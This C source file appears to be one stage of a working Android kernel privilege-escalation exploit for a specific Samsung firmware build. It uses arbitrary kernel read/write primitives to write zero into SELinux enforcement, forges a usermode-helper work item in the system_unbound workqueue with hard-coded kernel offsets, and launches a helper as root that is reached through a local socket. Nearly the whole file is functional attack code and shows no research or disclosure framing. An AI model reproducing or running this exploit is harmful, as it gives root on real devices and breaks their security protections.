#define _GNU_SOURCE
#include <fcntl.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <unistd.h>

#include "08_ashmem_configfs_rw.h"
#include "90_diagnostic_checkpoint.h"
#include "09_pipe_buffer_rw.h"
#include "10_workqueue_umh_root.h"

/* target.h constants for dm3q-S918BXXSAFZH3, inlined per this
 * project's established style (05_mm_slab_grooming.c/04_fake_kernel_objects.c do the same
 * rather than #include the old engine's target.h). Values copied
 * verbatim, not re-derived. */
#define SELINUX_ENFORCING_OFF 0x02d8e5c0ULL
#define SYSTEM_UNBOUND_WQ_OFF 0x02a90800ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x001045d0ULL
#define WQ_DFL_PWQ_OFF 0xb0
#define PWQ_POOL_OFF 0x00
#define PWQ_WQ_OFF 0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF 0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF 0x5c
#define PWQ_MAX_ACTIVE_OFF 0x60
#define POOL_WORKLIST_OFF 0x20
#define POOL_NR_IDLE_OFF 0x34
#define WORK_DATA_OFF 0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF 0x18
#define ROOT_UMH_WORK_OFF 0x6000ULL
#define ROOT_UMH_DATA_OFF 0x6200ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL

#define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"

/* source: this project's src/root.c -- identical layouts, already
 * BTF/offsetof-verified there. */
struct umh_subprocess_info {
  uint8_t work[48];
  uint64_t complete;
  uint64_t path;
  uint64_t argv;
  uint64_t envp;
  int32_t wait;
  int32_t retval;
  uint64_t init;
  uint64_t cleanup;
  uint64_t data;
};

struct umh_completion {
  uint32_t done;
  uint32_t pad0;
  uint32_t lock;
  uint32_t pad1;
  uint64_t next;
  uint64_t prev;
};

struct umh_kernel_data {
  struct umh_completion completion;
  char path[256];
  char arg[16];
  char uid[16];
  uint64_t argv[4];
  uint64_t envp[1];
};

_Static_assert(sizeof(struct umh_subprocess_info) == 112,
               "subprocess_info layout");
_Static_assert(sizeof(struct umh_completion) == 32, "completion layout");

static int is_direct_ptr(uint64_t value) {
  return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END;
}

static int pipe_read32(int fd, uint64_t target_addr, uint32_t *value) {
  uint64_t wide = 0;
  if (!oss_pipe_rw_read(fd, target_addr, &wide, sizeof(wide))) {
    return 0;
  }
  *value = (uint32_t)wide;
  return 1;
}

static int pipe_write32(int fd, uint64_t target_addr, uint32_t value) {
  return oss_pipe_rw_write(fd, target_addr, &value, sizeof(value));
}

static int pipe_read64(int fd, uint64_t target_addr, uint64_t *value) {
  return oss_pipe_rw_read(fd, target_addr, value, sizeof(*value));
}

static int pipe_write64(int fd, uint64_t target_addr, uint64_t value) {
  return oss_pipe_rw_write(fd, target_addr, &value, sizeof(value));
}

/* source: root.c:wake_system_unbound -- generic pty-alloc trick to
 * force a system_unbound_wq flush without depending on any specific
 * kernel offset. */
static int wake_system_unbound(void) {
  char slave_name[128];
  int master_fd = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (master_fd < 0 || grantpt(master_fd) != 0 || unlockpt(master_fd) != 0 ||
      ptsname_r(master_fd, slave_name, sizeof(slave_name)) != 0) {
    if (master_fd >= 0) {
      close(master_fd);
    }
    return 0;
  }
  int slave_fd = open(slave_name, O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (slave_fd < 0) {
    close(master_fd);
    return 0;
  }
  int master_close = close(master_fd);
  int slave_close = close(slave_fd);
  return master_close == 0 && slave_close == 0;
}

static int root_socket_ready(void) {
  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    return 0;
  }
  struct sockaddr_un sun;
  memset(&sun, 0, sizeof(sun));
  sun.sun_family = AF_UNIX;
  snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", ROOT_SOCKET_PATH);
  int ready = connect(fd, (struct sockaddr *)&sun, sizeof(sun)) == 0;
  close(fd);
  return ready;
}

struct workqueue_snapshot {
  uint64_t list_next;
  uint64_t list_prev;
  uint64_t pwq_pool;
  uint64_t pwq_wq;
  uint32_t nr_idle;
  uint32_t color;
  uint32_t refcnt;
  uint32_t nr_inflight;
  uint32_t nr_active;
  uint32_t max_active;
};

static int read_workqueue_snapshot(int fd, uint64_t wq, uint64_t pwq,
                                   uint64_t pool,
                                   struct workqueue_snapshot *snapshot) {
  memset(snapshot, 0, sizeof(*snapshot));
  uint64_t worklist = pool + POOL_WORKLIST_OFF;
  if (!pipe_read64(fd, worklist, &snapshot->list_next) ||
      !pipe_read64(fd, worklist + sizeof(uint64_t), &snapshot->list_prev) ||
      !pipe_read64(fd, pwq + PWQ_POOL_OFF, &snapshot->pwq_pool) ||
      !pipe_read64(fd, pwq + PWQ_WQ_OFF, &snapshot->pwq_wq) ||
      !pipe_read32(fd, pool + POOL_NR_IDLE_OFF, &snapshot->nr_idle) ||
      !pipe_read32(fd, pwq + PWQ_WORK_COLOR_OFF, &snapshot->color) ||
      !pipe_read32(fd, pwq + PWQ_REFCNT_OFF, &snapshot->refcnt) ||
      !pipe_read32(fd, pwq + PWQ_NR_ACTIVE_OFF, &snapshot->nr_active) ||
      !pipe_read32(fd, pwq + PWQ_MAX_ACTIVE_OFF, &snapshot->max_active) ||
      snapshot->color >= 16 || snapshot->pwq_pool != pool ||
      snapshot->pwq_wq != wq) {
    return 0;
  }
  uint64_t inflight_addr =
      pwq + PWQ_NR_IN_FLIGHT_OFF + snapshot->color * sizeof(uint32_t);
  return pipe_read32(fd, inflight_addr, &snapshot->nr_inflight);
}

int root_umh_install_fd_tracked(int fd, uint64_t kernel_base,
                                uint64_t page_base,
                                const char *root_umh_path,
                                int32_t *kernel_state,
                                int32_t irreversible_state) {
  uint64_t selinux_addr = kernel_base + SELINUX_ENFORCING_OFF;
  uint8_t permissive = 0;
  uint64_t fake_work_addr = page_base + ROOT_UMH_WORK_OFF;
  uint64_t umh_data_addr = page_base + ROOT_UMH_DATA_OFF;
  struct umh_kernel_data umh_data;
  memset(&umh_data, 0, sizeof(umh_data));

  if (snprintf(umh_data.path, sizeof(umh_data.path), "%s", root_umh_path) >=
      (int)sizeof(umh_data.path)) {
    fprintf(stderr, "[root_umh] helper path too long\n");
    return 0;
  }
  snprintf(umh_data.arg, sizeof(umh_data.arg), "%s", "--umh");
  snprintf(umh_data.uid, sizeof(umh_data.uid), "%u", getuid());

  uint64_t completion_addr =
      umh_data_addr + offsetof(struct umh_kernel_data, completion);
  uint64_t wait_list_addr =
      completion_addr + offsetof(struct umh_completion, next);
  uint64_t path_addr = umh_data_addr + offsetof(struct umh_kernel_data, path);
  uint64_t arg_addr = umh_data_addr + offsetof(struct umh_kernel_data, arg);
  uint64_t uid_addr = umh_data_addr + offsetof(struct umh_kernel_data, uid);
  uint64_t argv_addr = umh_data_addr + offsetof(struct umh_kernel_data, argv);
  uint64_t envp_addr = umh_data_addr + offsetof(struct umh_kernel_data, envp);
  umh_data.completion.next = wait_list_addr;
  umh_data.completion.prev = wait_list_addr;
  umh_data.argv[0] = path_addr;
  umh_data.argv[1] = arg_addr;
  umh_data.argv[2] = uid_addr;
  umh_data.argv[3] = 0;
  umh_data.envp[0] = 0;
  uint64_t umh_work_func = kernel_base + CALL_USERMODEHELPER_EXEC_WORK_OFF;

  unlink(ROOT_SOCKET_PATH);
  if (!oss_kernel_write(fd, selinux_addr, &permissive, sizeof(permissive))) {
    fprintf(stderr, "[root_umh] selinux write failed\n");
    return 0;
  }

  uint64_t wq_slot = kernel_base + SYSTEM_UNBOUND_WQ_OFF;
  uint64_t wq = oss_kernel_read64(fd, wq_slot);
  if (!is_direct_ptr(wq)) {
    fprintf(stderr, "[root_umh] bad workqueue wq=%016llx\n",
            (unsigned long long)wq);
    return 0;
  }
  uint64_t pwq = 0;
  if (!pipe_read64(fd, wq + WQ_DFL_PWQ_OFF, &pwq) ||
      !is_direct_ptr(pwq)) {
    fprintf(stderr, "[root_umh] bad workqueue pwq=%016llx\n",
            (unsigned long long)pwq);
    return 0;
  }
  uint64_t pool = 0;
  if (!pipe_read64(fd, pwq + PWQ_POOL_OFF, &pool) ||
      !is_direct_ptr(pool)) {
    fprintf(stderr, "[root_umh] bad workqueue pool=%016llx\n",
            (unsigned long long)pool);
    return 0;
  }
  uint64_t pwq_wq = 0;
  if (!pipe_read64(fd, pwq + PWQ_WQ_OFF, &pwq_wq) || pwq_wq != wq) {
    fprintf(stderr,
            "[root_umh] bad workqueue wq=%016llx pwq=%016llx pool=%016llx "
            "pwq_wq=%016llx\n",
            (unsigned long long)wq, (unsigned long long)pwq,
            (unsigned long long)pool, (unsigned long long)pwq_wq);
    return 0;
  }

  uint64_t worklist = pool + POOL_WORKLIST_OFF;
  uint64_t list_next = 0, list_prev = 0;
  uint32_t nr_idle = 0;
  for (int i = 0; i < 200; i++) {
    if (!pipe_read64(fd, worklist, &list_next) ||
        !pipe_read64(fd, worklist + sizeof(uint64_t), &list_prev) ||
        !pipe_read32(fd, pool + POOL_NR_IDLE_OFF, &nr_idle)) {
      fprintf(stderr, "[root_umh] worklist read failed\n");
      return 0;
    }
    if (list_next == worklist && list_prev == worklist && nr_idle > 0) {
      break;
    }
    usleep(1000);
  }
  if (list_next != worklist || list_prev != worklist || nr_idle == 0) {
    fprintf(stderr, "[root_umh] pool busy list=%016llx/%016llx idle=%u\n",
            (unsigned long long)list_next, (unsigned long long)list_prev,
            nr_idle);
    return 0;
  }

  uint64_t fake_entry = fake_work_addr + WORK_ENTRY_OFF;
  struct umh_subprocess_info fake;
  memset(&fake, 0, sizeof(fake));
  uint32_t color = 0, refcnt = 0, nr_active = 0, max_active = 0;
  if (!pipe_read32(fd, pwq + PWQ_WORK_COLOR_OFF, &color) ||
      !pipe_read32(fd, pwq + PWQ_REFCNT_OFF, &refcnt) ||
      !pipe_read32(fd, pwq + PWQ_NR_ACTIVE_OFF, &nr_active) ||
      !pipe_read32(fd, pwq + PWQ_MAX_ACTIVE_OFF, &max_active) || color >= 16 ||
      refcnt == 0 || nr_active >= max_active) {
    fprintf(stderr, "[root_umh] bad pwq state color=%u refcnt=%u active=%u/%u\n",
            color, refcnt, nr_active, max_active);
    return 0;
  }

  uint64_t inflight_addr =
      pwq + PWQ_NR_IN_FLIGHT_OFF + color * sizeof(uint32_t);
  uint32_t nr_inflight = 0;
  if (!pipe_read32(fd, inflight_addr, &nr_inflight)) {
    fprintf(stderr, "[root_umh] inflight counter read failed\n");
    return 0;
  }

  uint64_t work_data = pwq | ((uint64_t)color << 4) | 5;
  memcpy(fake.work + WORK_DATA_OFF, &work_data, sizeof(work_data));
  memcpy(fake.work + WORK_ENTRY_OFF, &worklist, sizeof(worklist));
  memcpy(fake.work + WORK_ENTRY_OFF + sizeof(uint64_t), &worklist,
         sizeof(worklist));
  memcpy(fake.work + WORK_FUNC_OFF, &umh_work_func, sizeof(umh_work_func));
  fake.complete = completion_addr;
  fake.path = path_addr;
  fake.argv = argv_addr;
  fake.envp = envp_addr;

  int data_write = oss_pipe_rw_write(fd, umh_data_addr, &umh_data,
                                     sizeof(umh_data));
  if (!data_write) {
    fprintf(stderr, "[root_umh] subprocess data write failed\n");
    return 0;
  }
  int work_write =
      oss_pipe_rw_write(fd, fake_work_addr, &fake, sizeof(fake));
  if (!work_write) {
    fprintf(stderr, "[root_umh] work item write failed\n");
    return 0;
  }

  /* Blob preparation can take long enough for the shared pool to change.
   * Require two consecutive, complete snapshots immediately before publish;
   * a partial list-only check missed concurrent counter/pwq changes. A busy
   * system_unbound_wq is transient, so wait briefly for the original safe
   * state instead of failing the entire one-shot exploit immediately. */
  oss_diag_checkpoint("umh-prepublish-snapshot");
  struct workqueue_snapshot snapshot_a = {0}, snapshot_b = {0},
                            snapshot_c = {0};
  int stable_snapshot = 0;
  for (int i = 0; i < 200; i++) {
    if (read_workqueue_snapshot(fd, wq, pwq, pool, &snapshot_a) &&
        (usleep(1000), 1) &&
        read_workqueue_snapshot(fd, wq, pwq, pool, &snapshot_b) &&
        (usleep(1000), 1) &&
        read_workqueue_snapshot(fd, wq, pwq, pool, &snapshot_c) &&
        memcmp(&snapshot_a, &snapshot_b, sizeof(snapshot_a)) == 0 &&
        memcmp(&snapshot_b, &snapshot_c, sizeof(snapshot_b)) == 0 &&
        snapshot_c.list_next == worklist &&
        snapshot_c.list_prev == worklist && snapshot_c.nr_idle > 0 &&
        snapshot_c.color == color && snapshot_c.refcnt == refcnt &&
        snapshot_c.nr_inflight == nr_inflight &&
        snapshot_c.nr_active == nr_active &&
        snapshot_c.max_active == max_active && nr_active < max_active) {
      stable_snapshot = 1;
      break;
    }
    usleep(1000);
  }
  if (!stable_snapshot) {
    fprintf(stderr,
            "[root_umh] unstable snapshot before publish "
            "list=%016llx/%016llx idle=%u color=%u counters=%u/%u/%u\n",
            (unsigned long long)snapshot_c.list_next,
            (unsigned long long)snapshot_c.list_prev, snapshot_c.nr_idle,
            snapshot_c.color, snapshot_c.nr_inflight, snapshot_c.nr_active,
            snapshot_c.refcnt);
    return 0;
  }

  /* From the first live counter-write attempt onward, the target may have
   * changed even when pipe-buffer restoration makes the primitive report
   * failure. Publish the terminal state first; no rollback below is safe
   * against a kworker concurrently consuming the partially queued item. */
  if (kernel_state) {
    __atomic_store_n(kernel_state, irreversible_state, __ATOMIC_RELEASE);
  }
  int inflight_write = pipe_write32(fd, inflight_addr, nr_inflight + 1);
  if (!inflight_write) {
    fprintf(stderr, "[root_umh] inflight counter write failed\n");
    return 0;
  }
  int active_write = pipe_write32(fd, pwq + PWQ_NR_ACTIVE_OFF, nr_active + 1);
  if (!active_write) {
    fprintf(stderr, "[root_umh] active counter write failed\n");
    return 0;
  }
  int refcnt_write = pipe_write32(fd, pwq + PWQ_REFCNT_OFF, refcnt + 1);
  if (!refcnt_write) {
    fprintf(stderr, "[root_umh] refcount write failed\n");
    return 0;
  }
  int counters_write = 1;
  int list_prev_write = pipe_write64(fd, worklist + sizeof(uint64_t), fake_entry);
  if (!list_prev_write) {
    /* The target write may have completed even if pipe-buffer restoration
     * failed. Treat the first list-write attempt as irreversible. */
    fprintf(stderr, "[root_umh] worklist prev write failed\n");
    return 0;
  }
  int list_next_write = pipe_write64(fd, worklist, fake_entry);
  if (!list_next_write) {
    /* The list is already mutated. Concurrent workers may have observed it;
     * blind rollback can corrupt a list that changed underneath us. */
    fprintf(stderr, "[root_umh] worklist next write failed\n");
    return 0;
  }
  int wake_ok = wake_system_unbound();
  fprintf(stderr,
          "[root_umh] queued wq=%016llx pwq=%016llx pool=%016llx work=%016llx "
          "entry=%016llx color=%u counters=%u/%u/%u writes=%d/%d/%d/%d/%d "
          "pre_list=%016llx/%016llx pre_idle=%u pre_counters=%u/%u/%u\n",
          (unsigned long long)wq, (unsigned long long)pwq,
          (unsigned long long)pool, (unsigned long long)fake_work_addr,
          (unsigned long long)fake_entry, color, nr_inflight, nr_active,
          refcnt, data_write, work_write, counters_write, list_prev_write,
          list_next_write, (unsigned long long)snapshot_c.list_next,
          (unsigned long long)snapshot_c.list_prev, snapshot_c.nr_idle,
          snapshot_c.nr_inflight, snapshot_c.nr_active, snapshot_c.refcnt);
  oss_diag_checkpoint("umh-queued");
  uint32_t complete_done = 0;
  for (int i = 0; i < 8 && !complete_done; i++) {
    if (i != 0) {
      wake_ok |= wake_system_unbound();
    }
    for (int j = 0; j < 250; j++) {
      if (!pipe_read32(fd, completion_addr, &complete_done)) {
        fprintf(stderr, "[root_umh] completion read failed\n");
        return 0;
      }
      if (complete_done) {
        break;
      }
      usleep(1000);
    }
  }

  int socket_ok = 0;
  if (complete_done) {
    for (int i = 0; i < 200; i++) {
      if (root_socket_ready()) {
        socket_ok = 1;
        break;
      }
      usleep(10000);
    }
  }

  fprintf(stderr, "[root_umh] result wake=%d complete=%u socket=%d\n", wake_ok,
          complete_done, socket_ok);
  oss_diag_checkpoint(socket_ok ? "umh-root-socket-ok" : "umh-root-socket-miss");
  return socket_ok;
}

int root_umh_install_fd(int fd, uint64_t kernel_base, uint64_t page_base,
                        const char *root_umh_path) {
  return root_umh_install_fd_tracked(fd, kernel_base, page_base, root_umh_path,
                                     NULL, 0);
}

/* Compatibility entry point for standalone harnesses. Production passes the
 * already verified descriptor to root_umh_install_fd(), matching the closed
 * binary's single-FD lifetime. Never retry a partially queued work item. */
int root_umh_install(uint64_t kernel_base, uint64_t page_base,
                     const char *root_umh_path) {
  int fd = oss_open_kernel_rw();
  if (fd < 0) {
    fprintf(stderr, "[root_umh] open resolved ashmem node failed\n");
    return 0;
  }
  uint64_t ashmem_misc_fops_addr = kernel_base + 0x02bfcf28ULL;
  int verified =
      oss_verify_kernel_access(fd, ashmem_misc_fops_addr, page_base);
  int pipe_ready = verified && oss_pipe_rw_install(fd, kernel_base, page_base);
  int rooted = pipe_ready &&
               root_umh_install_fd(fd, kernel_base, page_base, root_umh_path);
  close(fd);
  return rooted;
}
